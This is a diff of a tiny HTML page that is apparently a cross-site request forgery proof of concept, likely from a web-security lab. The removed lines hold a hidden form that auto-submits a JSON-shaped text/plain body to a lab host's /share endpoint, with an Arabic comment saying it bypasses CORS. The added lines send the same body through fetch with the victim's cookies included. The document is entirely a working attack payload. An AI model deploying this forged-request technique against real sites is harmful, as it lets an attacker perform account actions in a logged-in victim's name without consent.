@@ -1,12 +1,18 @@
 <!DOCTYPE html>
-<body>
-    <!-- هذا يتجاوز CORS تماماً -->
-    <form action="https://ptl-79baa299fd24-30bb5f04ec85.libcurl.me/share" 
-          method="POST" 
-          enctype="text/plain"
-          style="display:none">
-        <input name='{"user":"user1@gmail.com","id":0}' value='x'>
-    </form>
-    <script>document.forms[0].submit();</script>
-</body>
+<html>
+  <body>
+    <script>
+      fetch("https://example.com/share", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        credentials: "include",
+        body: JSON.stringify({
+          user: "user1@gmail.com",
+          id: 0
+        })
+      });
+    </script>
+  </body>
 </html>
